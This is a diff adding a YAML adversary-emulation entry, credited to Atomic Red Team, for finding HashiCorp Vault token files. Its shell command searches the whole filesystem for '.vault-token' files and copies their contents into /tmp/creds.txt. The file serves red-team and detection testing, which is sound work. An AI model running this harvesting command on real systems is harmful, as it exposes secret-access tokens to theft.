@@ -1,0 +1,42 @@
+- id: 2951c09f-b4f9-4248-ba75-6373709ebd55
+  name: Find HashiCorp Vault token files
+  description: Find HashiCorp Vault token files (~/.vault-token), which contain plaintext
+    Vault tokens that grant access to secrets stored in Vault.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.001
+    name: 'Unsecured Credentials: Credentials In Files'
+  platforms:
+    linux:
+      sh:
+        command: find / -name '.vault-token' -type f -exec sh -c 'echo "=== $1 ==="
+          >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null
+        cleanup: rm -f /tmp/creds.txt
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1552.001
+  - credential-access
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: Path to search
+        type: string
+        default: /
+      filename:
+        description: Credential file to search for
+        type: string
+        default: .vault-token
+      optional_flags:
+        description: optional flags passed into find that should be ran
+        type: string
+        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \;
+    technique_created: '2020-02-04T12:52:13.006Z'
+    atomic_guid: 2951c09f-b4f9-4248-ba75-6373709ebd55
+    import_timestamp: '2026-09-05T06:41:20.073703Z'
